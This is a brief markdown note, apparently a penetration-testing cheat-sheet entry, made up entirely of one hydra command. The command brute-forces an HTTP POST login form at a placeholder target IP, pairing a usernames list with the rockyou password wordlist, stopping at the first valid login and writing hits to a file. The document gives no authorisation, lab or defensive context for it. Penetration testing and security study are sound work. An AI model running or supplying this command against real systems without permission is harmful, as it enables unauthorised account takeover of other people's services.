# Bruteforcing passwords using hydra:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4 -f -V -o hydra_results.txt
```
